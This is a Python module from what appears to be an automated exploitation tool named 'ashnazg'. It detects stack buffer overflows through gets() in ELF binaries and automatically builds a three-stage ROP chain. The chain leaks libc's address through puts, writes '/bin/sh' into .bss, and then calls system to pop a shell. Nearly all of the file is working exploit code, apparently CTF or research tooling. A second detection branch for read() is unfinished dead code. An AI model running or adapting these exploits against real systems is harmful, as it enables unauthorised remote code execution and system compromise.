import smrop
import logging
import json

import pwn

logger = logging.getLogger('ashnazg')

ANALYSES = []
def register(clazz):
    # TODO: probably don't want to instantiate
    # here, makes more sense to instantiate
    # when the program context is available.
    ANALYSES.append(clazz)
    return clazz

class Vulnerability:

    @staticmethod
    def detect(context, function, program):
        raise NotImplementedError()
    
    # Probably don't care about this interface, we instantiate in detect
    def __init__(self, function, binary : pwn.ELF, libc : pwn.ELF):
        raise NotImplementedError()
    
    def exploit(self, function):
        raise NotImplementedError()

# These should probably be factored out into a separate
# function analysis module and be part of a Variable class or something
def isLocal(name, function):
    return name in [v["name"] for v in function["variables"]]

def isParameter(name, function):
    return name in function["arguments"]

def getLocal(name, function):
    for v in function["variables"]:
        if v["name"] == name:
            return v

@register
class StackBufferOverflowVulnerability(Vulnerability):
    name = "StackBufferOverflowVulnerability"
    short_name = "sbo"
    options = [("suffix", "str", "Ouput immediately after the buffer overflow call.")]

    def __init__(self,
            function,
            binary : pwn.ELF,
            libc : pwn.ELF,
            targetFunc,
            stackOffset,
            suffix):
        self.function = function
        self.binary = binary
        self.libc = libc
        self.targetFunc = targetFunc
        self.stackOffset = stackOffset
        self.suffix = suffix
    
    def __str__(self):
        fields = {
            "vulnerability": "StackBufferOverflowVulnerability",
            "function": str(self.function["name"]),
            "binary": str(self.binary),
            "libc": str(self.libc),
            "targetFunc": str(self.targetFunc),
            "stackOffset": str(self.stackOffset),
            "options": {
                "sbo.suffix": str(self.suffix)
            }
        }
        return json.dumps(fields, indent=2)

    @staticmethod
    def detect(context, function, program, options):
        for call in function["calls"]:
            if call["funcName"] == "gets":
                targetFunc = call
                # assume stack for now
                # need to add check to validate
                # that the argument is on the stack.
                # otherwise, this is not exploitable
                # via this technique
                # TODO: Add check
                arg = call["arguments"][0]
                arg = [v for v in function["variables"] if v["name"] == arg][0]
                stackOffset = arg["stackOffset"]
                # TODO: automatically determine "suffix"
                suffix = options.get("sbo.suffix", None)
                if suffix:
                    suffix = suffix.replace("\\n", "\n")
                return StackBufferOverflowVulnerability(function,
                    context.binary,
                    context.libc,
                    targetFunc=targetFunc,
                    stackOffset=stackOffset,
                    suffix=suffix)
                    
            # Work in progress apparently
            # Notes, uses old construction logic, need to update when you get around
            # to it
            continue
            if call["funcName"] == "read":
                targetBuffer = call["arguments"][1]
                # TODO: add analysis to ghidra to export type info
                # here to figure out if it's a variable or a constant
                targetSize = int(call["arguments"][2], 16)
                if isLocal(targetBuffer, function):
                    stackOffset = -getLocal(targetBuffer, function)["stackOffset"]
                    if targetSize > stackOffset:
                        self.targetFunc = call
                        self.stackOffset = stackOffset
                        return BufferOverflow
                # TODO: find calls to functions for potentially vulnerable 
                # variables.
                return None
        return None

    def entry(self):
        return int(self.function["address"], 16)

    # TODO: gate on detect
    def exploit(self, conn):
        conn = conn.conn
        function_addr = int(self.function["address"], 16) 
        
        prefix = b"A"*abs(self.stackOffset)

        # leak libc location
        sm = smrop.Smrop(binary=self.binary, libc=self.libc)
        sm.prefix(prefix)
        sm.pop_rdi(self.binary.got["gets"])
        # TODO: make puts a dependency
        # TODO: abstract out puts to any print
        sm.ret("puts", 'binary')
        sm.ret(function_addr, "binary")
        payload1 = sm.resolve(binary=0x0, libc=0x0)

        # clear out any pending stdout
        res = conn.recv()
        logger.debug(f"Initial: {res}")

        # read libc location
        logger.info("Sending first payload")
        conn.sendline(payload1)

        # Need to perform drain of non libc stuff
        if self.suffix:
            res = conn.recvuntil(self.suffix)
            logger.debug(f"Received suffix: {res}")

        # Now we are at the actual payload
        gets_location = conn.recvline()[:-1]
        logger.debug(f"gets_location: {gets_location}")
        gets_location = int.from_bytes(gets_location, byteorder='little')
        libcoffset = gets_location - self.libc.symbols["gets"]
        logger.info("Libc found at {}".format(hex(libcoffset)))

        # send /bin/sh
        sm = smrop.Smrop(binary=self.binary, libc=self.libc)
        sm.prefix(prefix)
        sm.pop_rdi(self.binary.bss()+0x100)
        sm.ret("gets", "binary")
        sm.ret(function_addr, "binary")
        payload2 = sm.resolve(binary=0x0)
        
        logger.info("sending second payload")
        conn.sendline(payload2)
        conn.sendline("/bin/sh\x00")

        # TODO: This isn't strictly necesary, and
        # would be better to detect via a model.
        res = conn.recv(timeout=1)
        logger.debug(f"clearing out any re-entry text: {res}")

        sm = smrop.Smrop(binary=self.binary, libc=self.libc)
        sm.prefix(prefix)
        sm.pop_rdi(self.binary.bss()+0x100)
        sm.nop()
        sm.ret("system", "libc")

        payload3 = sm.resolve(binary=0x0, libc=libcoffset)

        logger.info("Sending final payload")
        conn.sendline(payload3)
